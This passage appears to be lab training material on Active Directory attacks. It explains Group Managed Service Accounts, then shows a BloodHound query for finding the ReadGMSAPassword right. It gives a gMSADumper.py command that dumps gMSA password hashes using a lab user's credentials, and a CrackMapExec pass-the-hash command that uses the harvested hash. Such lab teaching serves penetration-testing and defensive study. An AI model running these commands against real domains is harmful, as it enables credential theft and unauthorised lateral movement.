
---
---
## ReadGMSAPassword

`Group Managed Service Accounts` (`gMSAs`) is a feature in Microsoft Active Directory that provides a secure and automated mechanism for managing service accounts used by applications and services running on Windows servers. Unlike regular service accounts, `gMSAs` have built-in password management and simplified key distribution, eliminating the need to manage and update passwords manually.

When a `gMSA` is created, it is associated with a specific Active Directory group, allowing multiple servers or applications to share the same `gMSA` for authentication. This association simplifies the administration and maintenance of service accounts across multiple systems.

A `gMSA` leverages a `secure key distribution process`, where the password is `automatically generated`, `securely stored`, and `periodically rotated` by the Active Directory domain controller. This eliminates the risk of the password being compromised or forgotten, reducing the attack surface and enhancing security.

By utilizing `gMSAs`, the associated principals (such as machine accounts, servers, or applications) are granted specific access rights through the use of a dedicated `DACLs` stored in the `msDS-GroupMSAMembership` attribute of the service account. These access rights can be tailored to meet the specific requirements of each principal, granting them access to the necessary resources and reducing the need for manual permission management.

If we get access to a principal (such as machine accounts, servers, or applications) that have access rights to use a `gMSA`, we can abuse it to obtain the group-managed service account password.

[dacledit.py](https://raw.githubusercontent.com/ShutdownRepo/impacket/dacledit/examples/dacledit.py) does not allow enumeration of this privilege. Therefore, let us use `BloodHound` to identify/enumerate it using a cypher query:

```cypher
MATCH p=((n)-[r:ReadGMSAPassword]->(m)) RETURN p
```

![read_gmsa_bloodhound.jpg](https://academy.hackthebox.com/storage/modules/219/read_gmsa_bloodhound.jpg)

`BloodHound` establishes a path revealing that `Pedro` actively possesse the access right `ReadGMSAPassword` over three `gMSAs` accounts. This path signifies `Pedro`'s direct authority and control over these accounts, meaning we can use his account to retrieve those passwords.
## Abusing ReadGMSAPassword from Linux

```c
python3 gMSADumper.py -d inlanefreight.local -l 10.129.205.81 -u pedro -p SecuringAD01
```

> We can then use `CrackMapExec` to validate the credentials we harvested. We can successfully authenticate as `jenkins-dev$`:

```c
poetry run crackmapexec ldap 10.129.205.81 -u jenkins-dev$ -H 4d8bcd4f5c70fe71beb848b4ab124e61
```

---
---
